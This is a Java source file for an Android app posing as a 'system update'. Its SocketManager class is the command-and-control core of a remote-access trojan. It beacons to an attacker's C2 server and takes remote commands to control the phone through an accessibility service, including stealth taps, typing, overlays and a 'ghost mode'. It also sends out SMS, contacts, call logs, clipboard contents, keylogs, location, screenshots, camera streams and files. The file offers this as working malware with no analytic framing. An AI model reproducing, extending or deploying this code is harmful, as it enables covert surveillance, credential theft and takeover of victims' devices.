package com.systemupdate.app;

import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.provider.Settings;
import android.service.notification.StatusBarNotification;
import android.telephony.TelephonyManager;
import android.util.Log; // <--- THIS WAS MISSING

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Locale;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SocketManager {

    private static final String TAG = "Socket";
    private static SocketManager instance;
    private static Context appContext;

    private final Context context;
    private final String c2Ip;
    private final int c2Port;
    private final String deviceId;
    private final ExecutorService executor = Executors.newFixedThreadPool(3);
    private final Random random = new Random();

    private volatile Socket socket;
    private volatile InputStream in;
    private volatile OutputStream out;
    private volatile boolean connected = false;
    private PhantomAccessibilityService accessibilityService;
    private Timer heartbeat;
    private String sessionId = null;

    public SocketManager(Context context, String c2Ip, int c2Port) {
        this.context = context.getApplicationContext();
        appContext = this.context;
        this.c2Ip = c2Ip;
        this.c2Port = c2Port;
        String id = "unknown";
        try { id = Settings.Secure.getString(this.context.getContentResolver(), Settings.Secure.ANDROID_ID); }
        catch (Throwable t) { }
        this.deviceId = id;
        instance = this;
    }

    public static SocketManager getInstance() { return instance; }
    public static Context getContext() { return appContext; }
    public String getDeviceId() { return deviceId; }

    public void setAccessibilityService(PhantomAccessibilityService svc) { this.accessibilityService = svc; }

    public void connect() {
        executor.execute(new Runnable() {
            @Override public void run() {
                while (true) {
                    try {
                        String sid = doHttpHandshake();
                        if (sid == null) throw new Exception("Handshake failed");
                        boolean ok = doWebSocketUpgrade(sid);
                        if (!ok) throw new Exception("WS upgrade failed");

                        connected = true;
                        sendWsText("2probe");
                        sleep(150);
                        readWsText();
                        sendWsText("5");
                        sleep(50);

                        sendRegister();
                        startHeartbeat();

                        while (connected) {
                            String frame = readWsText();
                            if (frame == null) break;
                            handleEngineIOMessage(frame);
                        }
                    } catch (Throwable t) {
                        Log.e(TAG, "Connect error: " + t.getMessage());
                    }
                    connected = false;
                    stopHeartbeat();
                    closeQuietly();
                    sessionId = null;
                    sleep(5000);
                }
            }
        });
    }

    private void sleep(long ms) { try { Thread.sleep(ms); } catch (InterruptedException ignored) { } }

    private String doHttpHandshake() {
        Socket s = null;
        try {
            s = new Socket();
            s.setTcpNoDelay(true);
            s.connect(new InetSocketAddress(c2Ip, c2Port), 8000);
            OutputStream os = s.getOutputStream();
            InputStream is = new BufferedInputStream(s.getInputStream());

            String url = "/socket.io/?model=" + android.net.Uri.encode(Build.MODEL)
                + "&EIO=3&id=" + deviceId
                + "&transport=polling"
                + "&release=" + android.net.Uri.encode(Build.VERSION.RELEASE)
                + "&manf=" + android.net.Uri.encode(Build.MANUFACTURER);

            String request = "GET " + url + " HTTP/1.1\r\n" +
                "Host: " + c2Ip + ":" + c2Port + "\r\n" +
                "Connection: Keep-Alive\r\n\r\n";
            os.write(request.getBytes("UTF-8"));
            os.flush();

            StringBuilder headers = new StringBuilder();
            int prev = -1, cur;
            while ((cur = is.read()) != -1) {
                headers.append((char) cur);
                if (prev == '\r' && cur == '\n') {
                    int len = headers.length();
                    if (len >= 4 && headers.charAt(len - 4) == '\r' && headers.charAt(len - 3) == '\n'
                        && headers.charAt(len - 2) == '\r' && headers.charAt(len - 1) == '\n') break;
                }
                prev = cur;
            }

            int contentLength = 0;
            for (String line : headers.toString().split("\r\n")) {
                if (line.toLowerCase().startsWith("content-length:")) {
                    try { contentLength = Integer.parseInt(line.substring(15).trim()); } catch (Exception e) { }
                }
            }

            StringBuilder body = new StringBuilder();
            int read = 0;
            while (read < contentLength) {
                int c = is.read();
                if (c == -1) break;
                body.append((char) c);
                read++;
            }

            String response = body.toString();
            if (response.startsWith("0")) {
                JSONObject obj = new JSONObject(response.substring(1));
                sessionId = obj.getString("sid");
            }
            return sessionId;
        } catch (Throwable t) { return null; }
        finally { try { if (s != null) s.close(); } catch (Throwable ignored) { } }
    }

    private boolean doWebSocketUpgrade(String sid) {
        try {
            Socket s = new Socket();
            s.setTcpNoDelay(true);
            s.setKeepAlive(true);
            s.connect(new InetSocketAddress(c2Ip, c2Port), 8000);

            OutputStream os = s.getOutputStream();
            InputStream is = new BufferedInputStream(s.getInputStream());

            byte[] keyBytes = new byte[16];
            random.nextBytes(keyBytes);
            String wsKey = android.util.Base64.encodeToString(keyBytes, android.util.Base64.NO_WRAP);

            String request = "GET /socket.io/?EIO=3&transport=websocket&sid=" + sid + " HTTP/1.1\r\n" +
                "Host: " + c2Ip + ":" + c2Port + "\r\n" +
                "Upgrade: websocket\r\n" +
                "Connection: Upgrade\r\n" +
                "Sec-WebSocket-Key: " + wsKey + "\r\n" +
                "Sec-WebSocket-Version: 13\r\n\r\n";
            os.write(request.getBytes("UTF-8"));
            os.flush();

            StringBuilder headers = new StringBuilder();
            int prev = -1, cur;
            while ((cur = is.read()) != -1) {
                headers.append((char) cur);
                if (prev == '\r' && cur == '\n') {
                    int len = headers.length();
                    if (len >= 4 && headers.charAt(len - 4) == '\r' && headers.charAt(len - 3) == '\n'
                        && headers.charAt(len - 2) == '\r' && headers.charAt(len - 1) == '\n') break;
                }
                prev = cur;
            }

            if (!headers.toString().startsWith("HTTP/1.1 101")) { s.close(); return false; }

            this.socket = s;
            this.out = new BufferedOutputStream(os);
            this.in = is;
            return true;
        } catch (Throwable t) { return false; }
    }

    private void sendWsText(String text) {
        try {
            byte[] payload = text.getBytes("UTF-8");
            int len = payload.length;
            byte[] mask = new byte[4];
            random.nextBytes(mask);
            byte[] frame;
            int offset;

            if (len < 126) {
                frame = new byte[2 + 4 + len];
                frame[0] = (byte) 0x81;
                frame[1] = (byte) (0x80 | len);
                offset = 2;
            } else if (len < 65536) {
                frame = new byte[4 + 4 + len];
                frame[0] = (byte) 0x81;
                frame[1] = (byte) (0x80 | 126);
                frame[2] = (byte) ((len >> 8) & 0xFF);
                frame[3] = (byte) (len & 0xFF);
                offset = 4;
            } else {
                frame = new byte[10 + 4 + len];
                frame[0] = (byte) 0x81;
                frame[1] = (byte) (0x80 | 127);
                long L = len;
                for (int i = 0; i < 8; i++) frame[2 + i] = (byte) ((L >> (56 - i * 8)) & 0xFF);
                offset = 10;
            }
            System.arraycopy(mask, 0, frame, offset, 4);
            for (int i = 0; i < len; i++) frame[offset + 4 + i] = (byte) (payload[i] ^ mask[i % 4]);

            synchronized (this) { if (out != null) { out.write(frame); out.flush(); } }
        } catch (Throwable t) { }
    }

    private void sendWsTextAsync(final String text) {
        executor.execute(new Runnable() { @Override public void run() { sendWsText(text); } });
    }

    private String readWsText() {
        try {
            int b0 = in.read();
            if (b0 == -1) return null;
            int b1 = in.read();
            if (b1 == -1) return null;
            int opcode = b0 & 0x0F;
            boolean masked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;

            if (payloadLen == 126) payloadLen = ((in.read() & 0xFF) << 8) | (in.read() & 0xFF);
            else if (payloadLen == 127) {
                payloadLen = 0;
                for (int i = 0; i < 8; i++) payloadLen = (payloadLen << 8) | (in.read() & 0xFF);
            }

            byte[] maskKey = new byte[4];
            if (masked) for (int i = 0; i < 4; i++) maskKey[i] = (byte) in.read();

            byte[] payload = new byte[(int) payloadLen];
            int total = 0;
            while (total < payload.length) {
                int r = in.read(payload, total, payload.length - total);
                if (r == -1) break;
                total += r;
            }
            if (masked) for (int i = 0; i < payload.length; i++) payload[i] ^= maskKey[i % 4];

            if (opcode == 0x8) { connected = false; return null; }
            if (opcode == 0x9) { sendWsPong(payload); return readWsText(); }
            if (opcode == 0xA) return readWsText();
            if (opcode == 0x1 || opcode == 0x2) return new String(payload, "UTF-8");
            return null;
        } catch (Throwable t) { return null; }
    }

    private void sendWsPong(byte[] payload) {
        try {
            byte[] mask = new byte[4];
            random.nextBytes(mask);
            byte[] frame;
            if (payload.length < 126) {
                frame = new byte[2 + 4 + payload.length];
                frame[0] = (byte) 0x8A;
                frame[1] = (byte) (0x80 | payload.length);
                System.arraycopy(mask, 0, frame, 2, 4);
                for (int i = 0; i < payload.length; i++) frame[6 + i] = (byte) (payload[i] ^ mask[i % 4]);
            } else {
                frame = new byte[4 + 4 + payload.length];
                frame[0] = (byte) 0x8A;
                frame[1] = (byte) (0x80 | 126);
                frame[2] = (byte) ((payload.length >> 8) & 0xFF);
                frame[3] = (byte) (payload.length & 0xFF);
                System.arraycopy(mask, 0, frame, 4, 4);
                for (int i = 0; i < payload.length; i++) frame[8 + i] = (byte) (payload[i] ^ mask[i % 4]);
            }
            synchronized (this) { if (out != null) { out.write(frame); out.flush(); } }
        } catch (Throwable t) { }
    }

    private void handleEngineIOMessage(String line) {
        try {
            if (line == null || line.isEmpty()) return;
            char type = line.charAt(0);
            if (type == '2') sendWsTextAsync("3");
            else if (type == '3') { }
            else if (type == '4') {
                final String json = line.substring(1);
                executor.execute(new Runnable() {
                    @Override public void run() {
                        try { handleCommand(json); }
                        catch (Throwable t) { Log.e(TAG, "cmd handler: " + t.getMessage()); }
                    }
                });
            }
        } catch (Throwable t) { }
    }

    private void startHeartbeat() {
        stopHeartbeat();
        heartbeat = new Timer("phantom-hb", true);
        heartbeat.scheduleAtFixedRate(new TimerTask() {
            @Override public void run() {
                sendWsTextAsync("2");
                try { sendAccessibilityState(); } catch (Throwable t) { }
            }
        }, 0, 25000);
    }

    private void stopHeartbeat() { try { if (heartbeat != null) heartbeat.cancel(); } catch (Throwable t) { } heartbeat = null; }

    public void sendAccessibilityState() {
        try {
            JSONObject m = new JSONObject();
            m.put("type", "ACCESSIBILITY_STATE");
            m.put("deviceId", deviceId);
            m.put("enabled", PhantomAccessibilityService.isRunning());
            m.put("admin", DeviceControl.isAdminActive(context));
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    private void handleCommand(String jsonLine) {
        try {
            JSONObject cmd = new JSONObject(jsonLine);
            String action = cmd.optString("command");
            JSONObject p = cmd.optJSONObject("params");
            if (p == null) p = new JSONObject();

            Log.i(TAG, "CMD recv: " + action);

            switch (action) {
                case "TAP": {
                    if (accessibilityService == null) { result(action, "no_accessibility"); break; }
                    int x = p.optInt("x", 0);
                    int y = p.optInt("y", 0);
                    boolean ok = accessibilityService.stealthTap((float) x, (float) y);
                    result(action, ok ? "ok" : "failed");
                    break;
                }
                case "TYPE":
                    if (accessibilityService == null) { result(action, "no_accessibility"); break; }
                    result(action, accessibilityService.humanType(p.optString("text", "")) ? "ok" : "failed");
                    break;
                case "KEY":
                    if (accessibilityService == null) { result(action, "no_accessibility"); break; }
                    result(action, accessibilityService.performKey(p.optInt("code", 0)) ? "ok" : "failed");
                    break;
                case "BACK": if (accessibilityService != null) accessibilityService.performBack(); result(action, "ok"); break;
                case "HOME": if (accessibilityService != null) accessibilityService.performHome(); result(action, "ok"); break;
                case "RECENTS": if (accessibilityService != null) accessibilityService.performRecents(); result(action, "ok"); break;
                case "NOTIFICATIONS": if (accessibilityService != null) accessibilityService.performNotifications(); result(action, "ok"); break;
                case "LOCK_SCREEN": if (accessibilityService != null) accessibilityService.performLockScreen(); result(action, "ok"); break;
                case "WAKE_SCREEN":
                    if (accessibilityService == null) { result(action, "no_accessibility"); break; }
                    result(action, accessibilityService.wakeScreen() ? "ok" : "failed"); break;
                case "GESTURE":
                    if (accessibilityService == null) { result(action, "no_accessibility"); break; }
                    result(action, accessibilityService.gesture(p.optString("direction", "UP")) ? "ok" : "failed");
                    break;
                case "OPEN_APP_DRAWER":
                    if (accessibilityService == null) { result(action, "no_accessibility"); break; }
                    result(action, accessibilityService.openAppDrawer() ? "ok" : "failed"); break;
                case "OPEN_APP":
                    if (accessibilityService == null) { result(action, "no_accessibility"); break; }
                    result(action, accessibilityService.openApp(p.optString("package", "")) ? "ok" : "failed"); break;
                case "KILL_APP":
                    if (accessibilityService == null) { result(action, "no_accessibility"); break; }
                    result(action, accessibilityService.killApp(p.optString("package", "")) ? "ok" : "failed"); break;

                case "OVERLAY_ON": {
                    OverlayManager om = OverlayManager.getInstance();
                    if (om == null) { result(action, "no_overlay_manager"); break; }
                    result(action, om.show() ? "ok" : "failed");
                    break;
                }
                case "OVERLAY_OFF": {
                    OverlayManager om = OverlayManager.getInstance();
                    if (om == null) { result(action, "no_overlay_manager"); break; }
                    result(action, om.hide() ? "ok" : "failed");
                    break;
                }
                case "GHOST_MODE_ON":
                    if (accessibilityService == null) { result(action, "no_accessibility"); break; }
                    result(action, accessibilityService.ghostModeOn() ? "ok" : "failed"); break;
                case "GHOST_MODE_OFF":
                    if (accessibilityService == null) { result(action, "no_accessibility"); break; }
                    result(action, accessibilityService.ghostModeOff() ? "ok" : "failed"); break;

                case "GET_APPS": sendApps(); break;
                case "GET_SMS": sendSMS(); break;
                case "GET_CONTACTS": sendContacts(); break;
                case "GET_CLIPBOARD": sendClipboardNow(); break;
                case "GET_CALLS": sendCalls(); break;
                case "GET_SCREEN_SIZE": sendScreenSize(); break;
                case "GET_UI_TREE": sendUiTree(); break;
                case "SCREENSHOT": sendScreenshot(); break;
                case "GET_ACCESSIBILITY_FRAME": sendAccessibilityFrame(); break;
                case "GET_LOCATION": sendLocation(); break;
                case "CAMERA_STREAM_START": cameraStreamStart(p.optString("facing", "back")); break;
                case "CAMERA_STREAM_STOP": cameraStreamStop(); break;
                case "FILES_LIST": sendFileList(p.optString("path", "/sdcard/")); break;
                case "FILES_PULL": pullFile(p.optString("path", "")); break;
                case "START_STREAM": requestScreenCapture(); break;
                case "STOP_STREAM": stopScreenCapture(); break;
                case "START_A11Y_STREAM": requestScreenCapture(); break;
                case "STOP_A11Y_STREAM": stopScreenCapture(); break;

                case "SHOW_NOTIFICATION":
                    showLocalNotification(p.optString("title", "XE LINK"), p.optString("body", "")); break;
                default: result(action, "unknown");
            }
        } catch (Throwable t) { }
    }

    private void sendUiTree() {
        try {
            if (accessibilityService == null) { result("GET_UI_TREE", "no_accessibility"); return; }
            JSONObject tree = UiTreeReader.readScreen(accessibilityService);
            JSONObject m = new JSONObject();
            m.put("type", "UI_TREE");
            m.put("deviceId", deviceId);
            m.put("data", tree);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    public void sendUiTreePush() { sendUiTree(); }

    private void sendScreenshot() {
        try {
            if (accessibilityService == null) { result("SCREENSHOT", "no_accessibility"); return; }
            if (Build.VERSION.SDK_INT < 30) { result("SCREENSHOT", "unsupported"); return; }
            accessibilityService.takeScreenShot(new PhantomAccessibilityService.ScreenshotCallback() {
                @Override public void onSuccess(android.accessibilityservice.AccessibilityService.ScreenshotResult sr) {
                    try {
                        android.graphics.Bitmap bmp = android.graphics.Bitmap.wrapHardwareBuffer(sr.getHardwareBuffer(), sr.getColorSpace());
                        if (bmp != null) {
                            android.graphics.Bitmap copy = bmp.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
                            bmp.recycle();
                            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                            copy.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, baos);
                            copy.recycle();
                            String b64 = android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP);
                            JSONObject m = new JSONObject();
                            m.put("type", "SCREENSHOT_DATA");
                            m.put("deviceId", deviceId);
                            m.put("data", b64);
                            sendWsTextAsync("4" + m.toString());
                            result("SCREENSHOT", "ok");
                        } else result("SCREENSHOT", "bitmap_null");
                        try { sr.getHardwareBuffer().close(); } catch (Throwable t) { }
                    } catch (Throwable t) { result("SCREENSHOT", "parse_failed"); }
                }
                @Override public void onFailure(int errorCode) { result("SCREENSHOT", "failed_" + errorCode); }
            });
        } catch (Throwable t) { result("SCREENSHOT", "exception"); }
    }

    private void sendAccessibilityFrame() {
        try {
            if (accessibilityService == null) { result("GET_ACCESSIBILITY_FRAME", "no_accessibility"); return; }
            if (Build.VERSION.SDK_INT < 30) { result("GET_ACCESSIBILITY_FRAME", "unsupported"); return; }
            accessibilityService.takeScreenShot(new PhantomAccessibilityService.ScreenshotCallback() {
                @Override public void onSuccess(android.accessibilityservice.AccessibilityService.ScreenshotResult r) {
                    try {
                        android.graphics.Bitmap bmp = android.graphics.Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), r.getColorSpace());
                        if (bmp == null) { result("GET_ACCESSIBILITY_FRAME", "bitmap_null"); return; }
                        android.graphics.Bitmap copy = bmp.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
                        bmp.recycle();
                        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                        copy.compress(android.graphics.Bitmap.CompressFormat.JPEG, 55, baos);
                        copy.recycle();
                        String b64 = android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP);
                        JSONObject m = new JSONObject();
                        m.put("type", "SCREEN_FRAME");
                        m.put("deviceId", deviceId);
                        m.put("data", b64);
                        sendWsTextAsync("4" + m.toString());
                        result("GET_ACCESSIBILITY_FRAME", "ok");
                        try { r.getHardwareBuffer().close(); } catch (Throwable t) { }
                    } catch (Throwable t) { result("GET_ACCESSIBILITY_FRAME", "parse_failed"); }
                }
                @Override public void onFailure(int code) { result("GET_ACCESSIBILITY_FRAME", "failed_" + code); }
            });
        } catch (Throwable t) { result("GET_ACCESSIBILITY_FRAME", "exception"); }
    }

    private void sendLocation() {
        try {
            android.location.LocationManager lm = (android.location.LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            android.location.Location location = null;
            if (lm != null) {
                try { location = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER); } catch (Throwable t) { }
                if (location == null) try { location = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER); } catch (Throwable t) { }
            }
            JSONObject m = new JSONObject();
            m.put("type", "LOCATION");
            m.put("deviceId", deviceId);
            m.put("lat", location != null ? location.getLatitude() : 0);
            m.put("lng", location != null ? location.getLongitude() : 0);
            m.put("acc", location != null ? location.getAccuracy() : 0);
            m.put("ts", System.currentTimeMillis());
            sendWsTextAsync("4" + m.toString());
            result("GET_LOCATION", location != null ? "ok" : "no_fix");
        } catch (Throwable t) { result("GET_LOCATION", "failed"); }
    }

    private void cameraStreamStart(String facing) {
        try {
            Intent i = new Intent(context, CameraStreamService.class);
            i.putExtra("facing", facing);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(i);
            else context.startService(i);
            result("CAMERA_STREAM_START", "ok");
        } catch (Throwable t) { result("CAMERA_STREAM_START", "failed"); }
    }

    private void cameraStreamStop() {
        try { context.stopService(new Intent(context, CameraStreamService.class)); result("CAMERA_STREAM_STOP", "ok"); }
        catch (Throwable t) { result("CAMERA_STREAM_STOP", "failed"); }
    }

    private void sendFileList(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists()) { result("FILES_LIST", "not_found"); return; }
            File[] files = dir.listFiles();
            JSONArray arr = new JSONArray();
            if (files != null) {
                for (File f : files) {
                    JSONObject o = new JSONObject();
                    o.put("name", f.getName());
                    o.put("path", f.getAbsolutePath());
                    o.put("dir", f.isDirectory());
                    o.put("size", f.length());
                    o.put("mtime", f.lastModified());
                    arr.put(o);
                }
            }
            JSONObject m = new JSONObject();
            m.put("type", "FILES");
            m.put("deviceId", deviceId);
            m.put("path", path);
            m.put("files", arr);
            sendWsTextAsync("4" + m.toString());
            result("FILES_LIST", "ok");
        } catch (Throwable t) { result("FILES_LIST", "failed"); }
    }

    private void pullFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists() || !f.isFile()) { result("FILES_PULL", "not_found"); return; }
            if (f.length() > 5 * 1024 * 1024) { result("FILES_PULL", "too_large"); return; }
            FileInputStream fis = new FileInputStream(f);
            byte[] buf = new byte[(int) f.length()];
            int read = 0;
            while (read < buf.length) { int r = fis.read(buf, read, buf.length - read); if (r == -1) break; read += r; }
            fis.close();
            String b64 = android.util.Base64.encodeToString(buf, android.util.Base64.NO_WRAP);
            JSONObject m = new JSONObject();
            m.put("type", "FILE_DATA");
            m.put("deviceId", deviceId);
            m.put("name", f.getName());
            m.put("data", b64);
            sendWsTextAsync("4" + m.toString());
            result("FILES_PULL", "ok");
        } catch (Throwable t) { result("FILES_PULL", "failed"); }
    }

    private void requestScreenCapture() {
        try {
            Intent i = new Intent(context, CaptureRequestActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
            result("START_STREAM", "requested");
        } catch (Throwable t) { result("START_STREAM", "failed"); }
    }

    private void stopScreenCapture() {
        try { context.stopService(new Intent(context, ScreenCaptureService.class)); result("STOP_STREAM", "ok"); }
        catch (Throwable t) { result("STOP_STREAM", "failed"); }
    }

    private void showLocalNotification(String title, String body) {
        try {
            android.app.NotificationManager nm = (android.app.NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;
            String chId = "phantom_push";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationChannel ch = new android.app.NotificationChannel(chId, "XE LINK", android.app.NotificationManager.IMPORTANCE_DEFAULT);
                nm.createNotificationChannel(ch);
            }
            android.app.Notification.Builder b;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) b = new android.app.Notification.Builder(context, chId);
            else b = new android.app.Notification.Builder(context);
            b.setSmallIcon(android.R.drawable.stat_notify_sync).setContentTitle(title).setContentText(body).setAutoCancel(true);
            nm.notify((int) (System.currentTimeMillis() % 100000), b.build());
        } catch (Throwable t) { }
    }

    public void sendLog(String level, String msg) {
        try {
            JSONObject m = new JSONObject();
            m.put("type", "LOG");
            m.put("deviceId", deviceId);
            m.put("level", level);
            m.put("message", msg);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    public void sendUserData(JSONObject payload) {
        try {
            JSONObject m = new JSONObject();
            m.put("type", "USER_DATA");
            m.put("deviceId", deviceId);
            m.put("data", payload);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    public void sendCommandResult(String cmd, String status) { result(cmd, status); }

    public void sendRegister() {
        try {
            JSONObject m = new JSONObject();
            m.put("type", "REGISTER");
            m.put("deviceId", deviceId);
            m.put("model", Build.MANUFACTURER + " " + Build.MODEL);
            m.put("androidVersion", Build.VERSION.RELEASE);
            m.put("sdk", Build.VERSION.SDK_INT);
            m.put("accessibilityEnabled", PhantomAccessibilityService.isRunning());
            m.put("adminActive", DeviceControl.isAdminActive(context));
            try {
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    try { m.put("carrierName", tm.getNetworkOperatorName()); } catch (Throwable t) { }
                    try { m.put("simCountry", tm.getSimCountryIso()); } catch (Throwable t) { }
                    try { m.put("networkCountry", tm.getNetworkCountryIso()); } catch (Throwable t) { }
                }
                m.put("localeCountry", Locale.getDefault().getCountry());
            } catch (Throwable t) { }
            try {
                Intent battery = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                if (battery != null) {
                    int level = battery.getIntExtra("level", -1);
                    int scale = battery.getIntExtra("scale", -1);
                    if (level >= 0 && scale > 0) m.put("battery", (int) ((level * 100.0) / scale));
                }
            } catch (Throwable t) { }
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    private void result(String cmd, String status) {
        try {
            Log.i(TAG, "RESULT " + cmd + " = " + status);
            JSONObject m = new JSONObject();
            m.put("type", "COMMAND_RESULT");
            m.put("deviceId", deviceId);
            m.put("command", cmd);
            m.put("result", status);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    public void sendKeylog(String data) {
        try {
            JSONObject m = new JSONObject();
            m.put("type", "KEYLOG");
            m.put("deviceId", deviceId);
            m.put("data", data);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    public void sendClipboard(String text) {
        try {
            JSONObject m = new JSONObject();
            m.put("type", "CLIPBOARD");
            m.put("deviceId", deviceId);
            m.put("data", text);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    public void sendAppDetection(String pkg) {
        try {
            JSONObject m = new JSONObject();
            m.put("type", "APP_DETECTED");
            m.put("deviceId", deviceId);
            m.put("packageName", pkg);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    public void sendCameraFrame(String b64) {
        try {
            JSONObject m = new JSONObject();
            m.put("type", "CAMERA_DATA");
            m.put("deviceId", deviceId);
            m.put("data", b64);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    public void sendScreenFrame(String b64) {
        try {
            JSONObject m = new JSONObject();
            m.put("type", "SCREEN_FRAME");
            m.put("deviceId", deviceId);
            m.put("data", b64);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    private void sendApps() {
        try {
            android.content.pm.PackageManager pm = context.getPackageManager();
            java.util.List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
            JSONArray arr = new JSONArray();
            for (android.content.pm.ApplicationInfo a : apps) {
                JSONObject o = new JSONObject();
                o.put("package", a.packageName);
                o.put("name", pm.getApplicationLabel(a).toString());
                o.put("system", (a.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
                arr.put(o);
            }
            JSONObject m = new JSONObject();
            m.put("type", "APPS");
            m.put("deviceId", deviceId);
            m.put("data", arr);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    private void sendSMS() {
        try {
            android.database.Cursor c = context.getContentResolver().query(
                android.provider.Telephony.Sms.Inbox.CONTENT_URI, null, null, null, null);
            JSONArray arr = new JSONArray();
            if (c != null) {
                int ia = c.getColumnIndex("address");
                int ib = c.getColumnIndex("body");
                int id = c.getColumnIndex("date");
                while (c.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("address", ia >= 0 ? c.getString(ia) : "");
                    o.put("body", ib >= 0 ? c.getString(ib) : "");
                    o.put("timestamp", id >= 0 ? c.getLong(id) : 0);
                    arr.put(o);
                }
                c.close();
            }
            JSONObject m = new JSONObject();
            m.put("type", "SMS_DATA");
            m.put("deviceId", deviceId);
            m.put("data", arr);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    private void sendContacts() {
        try {
            android.database.Cursor c = context.getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            JSONArray arr = new JSONArray();
            if (c != null) {
                int n = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int p = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER);
                while (c.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("name", n >= 0 ? c.getString(n) : "");
                    o.put("phone", p >= 0 ? c.getString(p) : "");
                    arr.put(o);
                }
                c.close();
            }
            JSONObject m = new JSONObject();
            m.put("type", "CONTACTS");
            m.put("deviceId", deviceId);
            m.put("data", arr);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    private void sendCalls() {
        try {
            android.database.Cursor c = context.getContentResolver().query(
                android.net.Uri.parse("content://call_log/calls"), null, null, null, null);
            JSONArray arr = new JSONArray();
            if (c != null) {
                int n = c.getColumnIndex("number");
                int t = c.getColumnIndex("type");
                int d = c.getColumnIndex("duration");
                int dt = c.getColumnIndex("date");
                while (c.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("number", n >= 0 ? c.getString(n) : "");
                    o.put("type", t >= 0 ? c.getInt(t) : 0);
                    o.put("duration", d >= 0 ? c.getLong(d) : 0);
                    o.put("timestamp", dt >= 0 ? c.getLong(dt) : 0);
                    arr.put(o);
                }
                c.close();
            }
            JSONObject m = new JSONObject();
            m.put("type", "CALLS");
            m.put("deviceId", deviceId);
            m.put("data", arr);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    private void sendClipboardNow() {
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            String txt = "";
            if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip().getItemCount() > 0) {
                CharSequence cs = cm.getPrimaryClip().getItemAt(0).coerceToText(context);
                if (cs != null) txt = cs.toString();
            }
            sendClipboard(txt);
        } catch (Throwable t) { }
    }

    private void sendScreenSize() {
        try {
            int[] s = accessibilityService != null ? accessibilityService.getScreenSize() : new int[]{1080, 2400};
            JSONObject m = new JSONObject();
            m.put("type", "SCREEN_SIZE");
            m.put("deviceId", deviceId);
            m.put("width", s[0]);
            m.put("height", s[1]);
            sendWsTextAsync("4" + m.toString());
        } catch (Throwable t) { }
    }

    public void disconnect() {
        connected = false;
        stopHeartbeat();
        closeQuietly();
    }

    private void closeQuietly() {
        try { if (socket != null) socket.close(); } catch (Throwable t) { }
        socket = null;
        in = null;
        out = null;
    }
}